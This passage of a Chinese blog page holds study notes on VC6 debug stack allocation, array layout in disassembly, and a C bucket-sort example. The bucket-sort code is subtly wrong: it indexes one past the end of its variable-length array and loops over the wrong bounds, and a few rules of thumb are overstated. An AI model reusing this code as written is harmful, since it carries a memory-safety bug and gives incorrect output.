class=\"code\"><pre><span class=\"line\">空函数会分配40h的缓冲区,如果使用局部变量会在40h的基础上增加，  只适用于vc6-debug</span><br><span class=\"line\"></span><br><span class=\"line\">void func()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a = 1;</span><br><span class=\"line\">\tchar b = 2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">此时缓冲区分配了48，因为本机尺寸</span><br><span class=\"line\"></span><br><span class=\"line\">1、小于32位的局部变量，空间在分配时，按32位分配.</span><br><span class=\"line\">2、使用时按实际的宽度使用.</span><br><span class=\"line\">3、不要定义char/short类型的局部变量.</span><br><span class=\"line\">4、参数与局部变量没有本质区别，都是局部变量，都在栈中</span><br><span class=\"line\">5、完全可以把参数当初局部变量使用</span><br><span class=\"line\"></span><br><span class=\"line\">参数在执行前分配，局部变量在执行时分配，本质一样</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> a[<span class=\"number\">3</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;;</span><br><span class=\"line\"><span class=\"number\">0040</span>D740 &gt;/&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D741  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D743  |.  <span class=\"number\">83</span>EC <span class=\"number\">44</span>       sub     esp,<span class=\"number\">0x44</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D746  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D747  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D748  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D749  |.  <span class=\"number\">8</span>D7D BC       lea     edi,[local<span class=\"number\">.17</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D74C  |.  B9 <span class=\"number\">11000000</span>   mov     ecx,<span class=\"number\">0x11</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D751  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D756  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D758  |.  C645 FC <span class=\"number\">01</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x4</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D75C  |.  C645 FD <span class=\"number\">02</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x3</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D760  |.  C645 FE <span class=\"number\">03</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x2</span>],<span class=\"number\">0x3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D764  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D765  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D766  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D767  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D769  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D76A  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> a[<span class=\"number\">4</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>&#125;;</span><br><span class=\"line\"><span class=\"number\">0040</span>D740 &gt;/&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D741  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D743  |.  <span class=\"number\">83</span>EC <span class=\"number\">44</span>       sub     esp,<span class=\"number\">0x44</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D746  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D747  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D748  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D749  |.  <span class=\"number\">8</span>D7D BC       lea     edi,[local<span class=\"number\">.17</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D74C  |.  B9 <span class=\"number\">11000000</span>   mov     ecx,<span class=\"number\">0x11</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D751  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D756  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D758  |.  C645 FC <span class=\"number\">01</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x4</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D75C  |.  C645 FD <span class=\"number\">02</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x3</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D760  |.  C645 FE <span class=\"number\">03</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x2</span>],<span class=\"number\">0x3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D764  |.  C645 FF <span class=\"number\">04</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x1</span>],<span class=\"number\">0x4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D768  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D769  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D76A  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D76B  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D76D  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D76E  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">数组声明是需要常量来提升堆栈，使用时[]内可以是变量</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">char</span> i[<span class=\"number\">3</span>]  <span class=\"comment\">//缓冲区分配40+4</span></span><br><span class=\"line\"><span class=\"type\">char</span> i[<span class=\"number\">4</span>]  <span class=\"comment\">//缓冲区分配40+4</span></span><br><span class=\"line\"><span class=\"type\">short</span> i[<span class=\"number\">4</span>] <span class=\"comment\">//缓冲区分配40+4*2</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//缓冲区分配是按照本机宽度位数的倍数分配的，参考char[3] 和 char[4]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> y = <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> r;</span><br><span class=\"line\">    <span class=\"type\">int</span> arr[<span class=\"number\">10</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">    r = arr[<span class=\"number\">1</span>];</span><br><span class=\"line\">    r = arr[x];</span><br><span class=\"line\">    r = arr[x+y];</span><br><span class=\"line\">    r = arr[x*<span class=\"number\">2</span>+y];</span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D770 &gt;/&gt; \\<span class=\"number\">55</span>                  push    ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D771  |.  <span class=\"number\">8B</span>EC                mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D773  |.  <span class=\"number\">83</span>EC <span class=\"number\">74</span>             sub     esp,<span class=\"number\">0x74</span>        ;<span class=\"number\">0x74</span><span class=\"number\">-0x40</span>=<span class=\"number\">0x34</span>=<span class=\"number\">52</span>/<span class=\"number\">4</span>=<span class=\"number\">13</span> = <span class=\"number\">10</span> + <span class=\"number\">1</span> + <span class=\"number\">1</span> + <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D776  |.  <span class=\"number\">53</span>                  push    ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D777  |.  <span class=\"number\">56</span>                  push    esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D778  |.  <span class=\"number\">57</span>                  push    edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D779  |.  <span class=\"number\">8</span>D7D <span class=\"number\">8</span>C             lea     edi,[local<span class=\"number\">.29</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D77C  |.  B9 <span class=\"number\">1</span>D000000         mov     ecx,<span class=\"number\">0x1D</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D781  |.  B8 CCCCCCCC         mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D786  |.  F3:AB               rep     stos dword ptr es:[edi]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D788  |.  C745 FC <span class=\"number\">01000000</span>    mov     [local<span class=\"number\">.1</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D78F  |.  C745 F8 <span class=\"number\">02000000</span>    mov     [local<span class=\"number\">.2</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D796  |.  C745 CC <span class=\"number\">01000000</span>    mov     [local<span class=\"number\">.13</span>],<span class=\"number\">0x1</span>      ;低地址在上</span><br><span class=\"line\"><span class=\"number\">0040</span>D79D  |.  C745 D0 <span class=\"number\">02000000</span>    mov     [local<span class=\"number\">.12</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7A4  |.  C745 D4 <span class=\"number\">03000000</span>    mov     [local<span class=\"number\">.11</span>],<span class=\"number\">0x3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7AB  |.  C745 D8 <span class=\"number\">04000000</span>    mov     [local<span class=\"number\">.10</span>],<span class=\"number\">0x4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7B2  |.  C745 DC <span class=\"number\">05000000</span>    mov     [local<span class=\"number\">.9</span>],<span class=\"number\">0x5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7B9  |.  C745 E0 <span class=\"number\">06000000</span>    mov     [local<span class=\"number\">.8</span>],<span class=\"number\">0x6</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7C0  |.  C745 E4 <span class=\"number\">07000000</span>    mov     [local<span class=\"number\">.7</span>],<span class=\"number\">0x7</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7C7  |.  C745 E8 <span class=\"number\">08000000</span>    mov     [local<span class=\"number\">.6</span>],<span class=\"number\">0x8</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7CE  |.  C745 EC <span class=\"number\">09000000</span>    mov     [local<span class=\"number\">.5</span>],<span class=\"number\">0x9</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7D5  |.  C745 F0 <span class=\"number\">00000000</span>    mov     [local<span class=\"number\">.4</span>],<span class=\"number\">0x0</span></span><br><span class=\"line\"></span><br><span class=\"line\">;    r = arr[<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DC  |.  <span class=\"number\">8B</span>45 D0             mov     eax,[local<span class=\"number\">.12</span>]                                ; 反汇编中写的是定值，直接取值</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DF  |.  <span class=\"number\">8945</span> F4             mov     [local<span class=\"number\">.3</span>],eax                                 ;r = arr[<span class=\"number\">1</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">;    r = arr[x];</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E2  |.  <span class=\"number\">8B</span>4D FC             mov     ecx,[local<span class=\"number\">.1</span>]\t\t\t\t\t\t\t\t\t; ecx = <span class=\"number\">1</span>     <span class=\"number\">0x34</span> = <span class=\"number\">52</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7E5  |.  <span class=\"number\">8B</span>548D CC           mov     edx,dword ptr ss:[ebp+ecx*<span class=\"number\">4</span><span class=\"number\">-0x34</span>]             ; edx = <span class=\"number\">4</span><span class=\"number\">-34</span>=ebp<span class=\"number\">-0x30</span>=[local<span class=\"number\">.12</span>]=<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7E9  |.  <span class=\"number\">8955</span> F4             mov     [local<span class=\"number\">.3</span>],edx\t\t\t\t\t\t\t\t\t; r = <span class=\"number\">2</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D7EC  |.  <span class=\"number\">8B</span>45 FC             mov     eax,[local<span class=\"number\">.1</span>]\t\t\t\t\t\t\t\t\t; <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7EF  |.  <span class=\"number\">0345</span> F8             add     eax,[local<span class=\"number\">.2</span>]\t\t\t\t\t\t\t\t\t; eax = <span class=\"number\">1</span>+<span class=\"number\">2</span> = <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7F2  |.  <span class=\"number\">8B</span>4C85 CC           mov     ecx,dword ptr ss:[ebp+eax*<span class=\"number\">4</span><span class=\"number\">-0x34</span>]\t\t\t\t; ecx = [ebp<span class=\"number\">-0x28</span>] = [local<span class=\"number\">.10</span>] = <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7F6  |.  <span class=\"number\">894</span>D F4             mov     [local<span class=\"number\">.3</span>],ecx\t\t\t\t\t\t\t\t\t; r = <span class=\"number\">4</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D7F9  |.  <span class=\"number\">8B</span>55 FC             mov     edx,[local<span class=\"number\">.1</span>]\t\t\t\t\t\t\t\t\t; edx = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7FC  |.  <span class=\"number\">8B</span>45 F8             mov     eax,[local<span class=\"number\">.2</span>]\t\t\t\t\t\t\t\t\t; eax = <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7FF  |.  <span class=\"number\">8</span>D0C50              lea     ecx,dword ptr ds:[eax+edx*<span class=\"number\">2</span>]\t\t\t\t\t; ecx = <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D802  |.  <span class=\"number\">8B</span>548D CC           mov     edx,dword ptr ss:[ebp+ecx*<span class=\"number\">4</span><span class=\"number\">-0x34</span>]             ; edx = [local<span class=\"number\">.9</span>] = <span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D806  |.  <span class=\"number\">8955</span> F4             mov     [local<span class=\"number\">.3</span>],edx\t\t\t\t\t\t\t\t\t; r= <span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D809  |.  <span class=\"number\">5F</span>                  pop     edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D80A  |.  <span class=\"number\">5</span>E                  pop     esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D80B  |.  <span class=\"number\">5B</span>                  pop     ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D80C  |.  <span class=\"number\">8B</span>E5                mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D80E  |.  <span class=\"number\">5</span>D                  pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D80F  \\.  C3                  retn</span><br><span class=\"line\"></span><br><span class=\"line\">[ebp+ecx*<span class=\"number\">4</span><span class=\"number\">-0x34</span>]  每次减去<span class=\"number\">0x34</span>的原因，<span class=\"number\">0x34</span> = <span class=\"number\">52</span>，是该函数内所有局部变量一共分配的空间</span><br><span class=\"line\">ecx的值即为数组下标,去对应数组的下标即可取到对应的值,注意下标从<span class=\"number\">0</span>开始</span><br><span class=\"line\"><span class=\"type\">short</span> ecx * <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">int</span> a[<span class=\"number\">10</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;     <span class=\"comment\">//后面会用0补</span></span><br><span class=\"line\"></span><br><span class=\"line\">二维数组在汇编中和一维数组存储方式一样</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">int</span> a[<span class=\"number\">3</span>][<span class=\"number\">4</span>] = &#123;[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>],[],[]&#125;     <span class=\"comment\">//编译报错</span></span><br><span class=\"line\"><span class=\"type\">int</span> a[<span class=\"number\">3</span>][<span class=\"number\">4</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>&#125;;  <span class=\"comment\">//正常执行</span></span><br><span class=\"line\">多维数组只是用户使用方便，编译后的结果都一样</span><br><span class=\"line\"><span class=\"type\">int</span> a[][<span class=\"number\">4</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>&#125;;   <span class=\"comment\">//编译通过，编译器四个一组分配</span></span><br><span class=\"line\"><span class=\"type\">int</span> a[<span class=\"number\">3</span>][] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>&#125;;   <span class=\"comment\">//编译错误</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> arr[<span class=\"number\">5</span>][<span class=\"number\">12</span>] = &#123;&#125;</span><br><span class=\"line\">arr[<span class=\"number\">1</span>][<span class=\"number\">7</span>] = arr[<span class=\"number\">1</span>*<span class=\"number\">12</span>+<span class=\"number\">7</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> arr[<span class=\"number\">5</span>][<span class=\"number\">4</span>][<span class=\"number\">3</span>] = arr[<span class=\"number\">1</span>*<span class=\"number\">4</span>*<span class=\"number\">3</span> + <span class=\"number\">2</span>*<span class=\"number\">3</span> + <span class=\"number\">1</span>]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">桶排序</span><br><span class=\"line\"><span class=\"number\">1.</span>找数组中最大的，创建max+<span class=\"number\">1</span>个数的数组</span><br><span class=\"line\"><span class=\"number\">2.</span>下标对应改为出现的次数</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">dui</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a[<span class=\"number\">10</span>] = &#123;<span class=\"number\">9</span>,<span class=\"number\">8</span>,<span class=\"number\">7</span>,<span class=\"number\">7</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> max = a[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> p = <span class=\"number\">1</span>; p &lt; <span class=\"number\">10</span>; p++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (a[p]&gt;max)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tmax = a[p];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,max);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> b[max] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt;= max<span class=\"number\">-1</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tb[a[i]]++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt;= max<span class=\"number\">-1</span>; i++)</span><br><span class=\"line\">\t&#123; </span><br><span class=\"line\">\t\t<span class=\"type\">int</span> k = b[i];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (k &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> m = k; m&gt;<span class=\"number\">0</span>; m--)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,i);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tdui();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230113171701402.png\" alt=\"image-20230113171701402\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230114173623044.png\" alt=\"image-20230114173623044\"></p>\n<h3 id=\"结构体\"><a class=\"markdownIt-Anchor\" href=\"#结构体\">#</a> 结构体</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td 